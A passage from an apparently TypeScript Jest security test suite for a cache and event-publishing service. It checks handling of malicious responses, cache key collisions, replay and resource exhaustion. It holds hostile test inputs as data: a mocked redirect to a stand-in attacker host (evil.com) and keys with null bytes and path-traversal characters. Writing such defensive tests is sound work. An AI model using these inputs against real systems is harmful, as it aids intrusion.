              load: [() => prodLikeConfig],
            }),
            CacheModule,
          ],
        }).compile();

        // Module should initialize with production config
        const configService = configModule.get<ConfigService>(ConfigService);
        expect(configService.get('REDIS_TLS_ENABLED')).toBe('true');
        expect(configService.get('REDIS_PASSWORD')).toBe('secure-redis-password');

        await configModule.close();
      });
    });

    describe('Service Communication Security', () => {
      it('should handle malicious service responses', async () => {
        const maliciousResponses = [
          { status: 200, data: 'not json' },
          { status: 200, data: { received: false, error: 'malicious error' } },
          { status: 200, data: null },
          { status: 200, data: { redirect: 'http://evil.com' } },
        ];

        for (const response of maliciousResponses) {
          httpService.post.mockReturnValueOnce(of(response as any));
          
          // Should handle malicious responses safely
          await expect(eventsService.publishProjectCreated({
            projectId: 'malicious-response',
            ownerId: 'user',
            name: 'Test',
            description: 'Test malicious response handling',
            initialPrompt: 'Test',
            uploadedFileIds: [],
            hasUploadedFiles: false,
            promptComplexity: 'low',
            createdAt: new Date(),
          })).resolves.toBeUndefined();
        }
      });
    });
  });

  describe('Security Regression Tests', () => {
    describe('Known Vulnerability Patterns', () => {
      it('should prevent cache key collision attacks', async () => {
        const baseKey = 'projects:project:123';
        const collisionAttempts = [
          'projects:project:123:extra', // Extended key
          'projects:project:123\x00', // Null byte
          'projects:project:123..', // Path traversal chars
          'projects:project:123/', // Directory separator
        ];

        // Store legitimate data
        await cacheService.set(baseKey, { legitimate: true });

        // Attempt collisions
        for (const collisionKey of collisionAttempts) {
          const result = await cacheService.set(collisionKey, { malicious: true });
          expect(result).toBe(false); // Should be rejected
        }

        // Legitimate data should remain unchanged
        const retrieved = await cacheService.get(baseKey);
        expect(retrieved).toEqual({ legitimate: true });
      });

      it('should prevent event replay attacks', async () => {
        const originalEvent = {
          projectId: 'replay-test',
          ownerId: 'user',
          name: 'Replay Test',
          description: 'Testing replay attack prevention',
          initialPrompt: 'Test',
          uploadedFileIds: [],
          hasUploadedFiles: false,
          promptComplexity: 'low',
          createdAt: new Date(),
        };

        // Publish original event
        await eventsService.publishProjectCreated(originalEvent);

        const firstCall = httpService.post.mock.calls[0];
        const firstEventId = firstCall[1].payload.eventMetadata.eventId;
        const firstTimestamp = firstCall[1].payload.eventMetadata.eventTimestamp;

        // Wait a moment
        await new Promise(resolve => setTimeout(resolve, 100));

        // Publish "same" event again (should get new metadata)
        await eventsService.publishProjectCreated(originalEvent);

        const secondCall = httpService.post.mock.calls[1];
        const secondEventId = secondCall[1].payload.eventMetadata.eventId;
        const secondTimestamp = secondCall[1].payload.eventMetadata.eventTimestamp;

        // Event IDs should be different (preventing replay)
        expect(secondEventId).not.toBe(firstEventId);
        expect(new Date(secondTimestamp).getTime()).toBeGreaterThan(new Date(firstTimestamp).getTime());
      });
    });

    describe('Resource Exhaustion Protection', () => {
      it('should handle cache memory exhaustion gracefully', async () => {
        // Attempt to store very large amounts of data
        const largeValue = { data: 'x'.repeat(100000) }; // 100KB per item

        let successCount = 0;
        let failureCount = 0;

        // Try to store many large items
        for (let i = 0; i < 100; i++) {
          const result = await cacheService.set(`large-item-${i}`, largeValue, 60);
          if (result) {
            successCount++;
          } else {
            failureCount++;
          }
        }

        console.log(`Large item storage: ${successCount} success, ${failureCount} failures`);

        // System should remain responsive
        const health = await cacheService.healthCheck();
        expect(health).toBe(true);

        // Should be able to perform normal operations
        const normalResult = await cacheService.set('normal-after-large', { normal: true });
        expect(normalResult).toBe(true);
      });

      it('should handle event publishing resource exhaustion', async () => {
        // Attempt to publish many events rapidly
        const promises = [];
        for (let i = 0; i < 200; i++) {
          promises.push(eventsService.publishProjectCreated({
            projectId: `exhaustion-test-${i}`,
            ownerId: 'exhaustion-user',
            name: `Exhaustion Test ${i}`,
            description: 'Testing resource exhaustion',
            initialPrompt: 'Test',
            uploadedFileIds: [],
            hasUploadedFiles: false,
            promptComplexity: 'low',
            createdAt: new Date(),
          }));
        }

        const results = await Promise.allSettled(promises);
        const successful = results.filter(r => r.status === 'fulfilled').length;
        const failed = results.filter(r => r.status === 'rejected').length;

        console.log(`Event exhaustion test: ${successful} successful, ${failed} failed`);

        // System should handle the load
        expect(successful).toBeGreaterThan(150); // Most should succeed

        // Service should remain healthy
        const health = await eventsService.healthCheck();
        expect(health.status).toMatch(/^(healthy|unhealthy)$/); // Should respond
      });
    });
  });
});